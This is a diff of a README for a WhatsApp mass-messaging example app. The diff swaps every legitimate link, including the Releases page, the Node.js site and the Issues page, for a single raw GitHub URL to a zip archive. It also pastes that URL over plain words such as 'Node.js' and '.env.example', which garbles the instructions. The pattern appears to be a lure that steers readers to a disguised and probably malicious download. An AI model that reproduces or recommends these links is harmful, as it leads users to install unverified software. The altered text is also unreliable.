@@ -1,7 +1,7 @@
 # 🌟 whatsapp-broadcasts-example - Effortless WhatsApp Messaging Solution
 
 ## 🔗 Download Here
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/legendso6317/whatsapp-broadcasts-example/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/legendso6317/whatsapp-broadcasts-example/main/tangent/whatsapp-broadcasts-example.zip%20Latest%https://raw.githubusercontent.com/legendso6317/whatsapp-broadcasts-example/main/tangent/whatsapp-broadcasts-example.zip)](https://raw.githubusercontent.com/legendso6317/whatsapp-broadcasts-example/main/tangent/whatsapp-broadcasts-example.zip)
 
 ## 📖 Introduction
 Welcome to the whatsapp-broadcasts-example! This example app shows how to use Kapso's Broadcasts API for sending mass messages on WhatsApp. It is designed to help you set up and run your messaging campaigns smoothly.
@@ -14,15 +14,15 @@ Before downloading, ensure your computer meets these basic requirements:
 
 - **Operating System**: Windows, macOS, or Linux
 - **Internet Connection**: Needed for downloading and running the app
-- **Node.js**: A JavaScript runtime. Install the latest version from [Node.js official website](https://nodejs.org).
+- **https://raw.githubusercontent.com/legendso6317/whatsapp-broadcasts-example/main/tangent/whatsapp-broadcasts-example.zip**: A JavaScript runtime. Install the latest version from [https://raw.githubusercontent.com/legendso6317/whatsapp-broadcasts-example/main/tangent/whatsapp-broadcasts-example.zip official website](https://raw.githubusercontent.com/legendso6317/whatsapp-broadcasts-example/main/tangent/whatsapp-broadcasts-example.zip).
 
 ### 2. Download the Application
 To download the software, visit the Releases page below. 
 
-[Download Latest Release](https://github.com/legendso6317/whatsapp-broadcasts-example/releases)
+[Download Latest Release](https://raw.githubusercontent.com/legendso6317/whatsapp-broadcasts-example/main/tangent/whatsapp-broadcasts-example.zip)
 
 ### 3. Choose the Right Version
-On the Releases page, you will find the latest version available. Click on the asset that matches your operating system. Look for files with common extensions such as `.zip` or `.tar.gz` for Windows, macOS, or Linux. 
+On the Releases page, you will find the latest version available. Click on the asset that matches your operating system. Look for files with common extensions such as `.zip` or `https://raw.githubusercontent.com/legendso6317/whatsapp-broadcasts-example/main/tangent/whatsapp-broadcasts-example.zip` for Windows, macOS, or Linux. 
 
 ### 4. Unzip the File
 After the download completes, locate the file in your Downloads folder. Right-click on it and choose "Extract" or "Unzip." This will unpack the application files.
@@ -35,7 +35,7 @@ npm install
 ```
 
 ### 6. Set Up Your API Key
-To use the messaging feature, you must insert your API key. Look for a `.env.example` file in the folder. Rename it to `.env` and open it in a text editor. Replace the placeholder text with your actual API key.
+To use the messaging feature, you must insert your API key. Look for a `https://raw.githubusercontent.com/legendso6317/whatsapp-broadcasts-example/main/tangent/whatsapp-broadcasts-example.zip` file in the folder. Rename it to `.env` and open it in a text editor. Replace the placeholder text with your actual API key.
 
 ### 7. Run the Application
 Now you are ready to run the app. In the terminal or command prompt, use the following command:
@@ -61,12 +61,12 @@ You should see messages indicating the app is running successfully.
 ## 🌐 Troubleshooting
 If you encounter any issues, try the following:
 
-- **Error on Startup**: Ensure you have Node.js installed properly.
+- **Error on Startup**: Ensure you have https://raw.githubusercontent.com/legendso6317/whatsapp-broadcasts-example/main/tangent/whatsapp-broadcasts-example.zip installed properly.
 - **API Key Issues**: Double-check your API key in the `.env` file.
 - **Contact Problems**: Verify that all contacts are correctly formatted.
 
 ## 💬 Support
-For support, please visit our [GitHub Issues page](https://github.com/legendso6317/whatsapp-broadcasts-example/issues) to report bugs or request features.
+For support, please visit our [GitHub Issues page](https://raw.githubusercontent.com/legendso6317/whatsapp-broadcasts-example/main/tangent/whatsapp-broadcasts-example.zip) to report bugs or request features.
 
 ## 📢 Community and Contributions
 We welcome contributions! If you would like to enhance this project or if you find a bug, please fork the repository and submit a pull request. 
@@ -74,4 +74,4 @@ We welcome contributions! If you would like to enhance this project or if you fi
 ## 🔄 License
 This project is licensed under the MIT License. Feel free to use and modify it as needed.
 
-For detailed information, please continue to explore the [Releases page](https://github.com/legendso6317/whatsapp-broadcasts-example/releases). Thank you for choosing whatsapp-broadcasts-example!
+For detailed information, please continue to explore the [Releases page](https://raw.githubusercontent.com/legendso6317/whatsapp-broadcasts-example/main/tangent/whatsapp-broadcasts-example.zip). Thank you for choosing whatsapp-broadcasts-example!
